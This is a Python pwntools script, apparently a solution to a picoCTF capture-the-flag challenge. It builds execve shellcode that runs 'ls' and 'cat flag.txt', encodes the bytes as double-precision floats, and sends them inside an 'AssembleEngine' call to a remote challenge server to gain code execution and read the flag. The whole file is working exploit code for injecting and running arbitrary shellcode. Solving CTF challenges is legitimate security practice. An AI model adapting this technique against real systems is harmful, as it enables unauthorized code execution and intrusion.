from pwn import *
import struct

context.arch = 'amd64'

ls = asm(shellcraft.execve(b"/bin/ls", ["ls"]))
cat = asm(shellcraft.execve(b"/bin/cat", ["cat", "flag.txt"]))

def convert_to_double_array(shellcode: bytes) -> [float]:
  res: [float] = []
  for i in range(0, len(shellcode), 8):
    block = shellcode[i:i+8]
    if len(block) < 8:
      block = block + b"\0" * (8 - len(block))
    print(block)
    res.append(struct.unpack("<d", block)[0])
    print(res)
  return res

def run(shellcode: [float]):
  print(shellcode)
  code = f"AssembleEngine([{', '.join(map(str, shellcode))}])"
  success(f'code = {code}')
  p = remote("mercury.picoctf.net", 48700)
  p.sendlineafter(b"Provide size", str(len(code)).encode())
  p.sendlineafter(b"Provide script", code.encode())
  print(p.recvall().decode())

run(convert_to_double_array(ls))
run(convert_to_double_array(cat))
